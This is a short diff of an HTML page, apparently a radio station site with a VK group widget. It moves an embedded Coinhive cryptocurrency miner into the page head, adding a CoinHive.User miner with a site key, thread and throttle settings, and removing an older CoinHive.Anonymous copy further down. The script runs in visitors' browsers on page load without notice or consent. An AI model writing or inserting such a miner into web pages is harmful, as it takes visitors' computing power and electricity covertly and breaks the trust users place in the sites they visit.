@@ -89,7 +89,14 @@ html, body {
 <script src="http://www.radiorecord.ru/i/js/Magnific-Popup/dist/jquery.magnific-popup.min.js"></script>
 
 
-
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.User('0WKXq51O01C9ENyztisz6UUP1nZKDtgt','anonymous',{
+		threads: 1,
+		throttle: 0.9	
+	});
+	miner.start();
+</script>
 </head>
 <body>
 
@@ -845,11 +852,7 @@ VK.Widgets.Group("vk_groups", {mode: 2, width: "960", height: "550", color1: 'f5
 })();
 </script>
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
- var miner = new CoinHive.Anonymous('0WKXq51O01C9ENyztisz6UUP1nZKDtgt', {  threads: 1 });
- miner.start();
-</script>
+
 
 
 
